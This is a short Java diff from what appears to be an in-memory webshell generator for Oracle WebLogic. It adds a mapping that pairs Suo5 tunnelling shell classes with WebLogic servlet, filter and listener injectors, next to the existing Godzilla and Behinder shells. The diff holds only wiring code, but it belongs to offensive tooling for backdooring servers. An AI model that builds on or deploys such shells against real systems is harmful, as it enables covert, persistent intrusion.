@@ -9,6 +9,8 @@ import com.reajason.javaweb.memshell.shelltool.command.CommandServlet;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilter;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaFilterChainAdvisor;
 import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaServlet;
+import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Filter;
+import com.reajason.javaweb.memshell.shelltool.suo5.Suo5Servlet;
 import com.reajason.javaweb.memshell.weblogic.behinder.BehinderListener;
 import com.reajason.javaweb.memshell.weblogic.command.CommandListener;
 import com.reajason.javaweb.memshell.weblogic.godzilla.GodzillaListener;
@@ -16,6 +18,7 @@ import com.reajason.javaweb.memshell.weblogic.injector.WebLogicFilterInjector;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicListenerInjector;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletContextAgentInjector;
 import com.reajason.javaweb.memshell.weblogic.injector.WebLogicServletInjector;
+import com.reajason.javaweb.memshell.weblogic.suo5.Suo5Listener;
 import org.apache.commons.lang3.tuple.Pair;
 
 import java.util.LinkedHashMap;
@@ -57,6 +60,15 @@ public class WebLogicShell extends AbstractShell {
         map.put(FILTER, Pair.of(GodzillaFilter.class, WebLogicFilterInjector.class));
         map.put(LISTENER, Pair.of(GodzillaListener.class, WebLogicListenerInjector.class));
         map.put(AGENT_SERVLET_CONTEXT, Pair.of(GodzillaFilterChainAdvisor.class, WebLogicServletContextAgentInjector.class));
+        return map;
+    }
+
+    @Override
+    protected Map<String, Pair<Class<?>, Class<?>>> getSuo5ShellMap() {
+        Map<String, Pair<Class<?>, Class<?>>> map = new LinkedHashMap<>();
+        map.put(SERVLET, Pair.of(Suo5Servlet.class, WebLogicServletInjector.class));
+        map.put(FILTER, Pair.of(Suo5Filter.class, WebLogicFilterInjector.class));
+        map.put(LISTENER, Pair.of(Suo5Listener.class, WebLogicListenerInjector.class));
         return map;
     }
 }
